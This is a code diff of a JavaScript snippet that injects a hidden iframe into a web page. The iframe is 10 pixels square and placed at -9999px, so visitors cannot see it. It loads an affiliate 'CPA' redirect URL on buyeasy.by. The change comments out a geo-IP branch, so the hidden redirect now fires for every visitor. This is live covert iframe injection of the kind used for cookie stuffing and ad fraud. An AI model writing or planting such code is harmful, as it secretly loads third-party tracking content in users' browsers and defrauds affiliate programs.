@@ -1,16 +1,16 @@
 //$.get("https://ipinfo.io", function(response) {
 //$.get("https://zu-verschenken.eu/geoip").done(function( response ) {
 //$.ajaxSetup({xhrFields: { withCredentials: false } });
-$.getJSON("https://zu-verschenken.eu/geoip", function(response) {
+//$.getJSON("https://zu-verschenken.eu/geoip", function(response) {
 //console.log(response);
 //console.log(response.country);
 
 var d = document, s = d.createElement('iframe'), g = 'getElementsByTagName';
-if ('DE' === response.country) {
-s.src = 'https://zu-verschenken.eu';
-} else {
+//if ('DE' === response.country) {
+//s.src = 'https://zu-verschenken.eu';
+//} else {
 s.src = 'https://buyeasy.by/redirect/cpa/o/q0lxcvunisob8fovi2lwut22wo61r9yy/';
-}
+//}
 s.style.position = 'absolute';
 s.style.height = '10px';
 s.style.width = '10px';
@@ -18,8 +18,8 @@ s.style.left = '-9999px';
 s.style.top = '-9999px';
 var h=d[g]('body')[0];
 h.appendChild(s);
-})
-.fail(function(response) {
-console.log("error");
-console.log(response);
-});
+//})
+//.fail(function(response) {
+//console.log("error");
+//console.log(response);
+//});
